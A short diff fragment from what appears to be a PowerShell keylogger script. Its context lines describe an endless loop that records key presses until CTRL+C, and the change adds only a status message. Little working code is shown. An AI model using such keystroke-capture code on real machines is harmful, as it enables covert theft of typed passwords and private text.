@@ -21,6 +21,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     # create endless loop. When user presses CTRL+C, finally-block
     # executes and shows the collected key presses
 
+'Starting Keyboard Special Recording'
+
 $recording = $true
 while ($recording) {
     
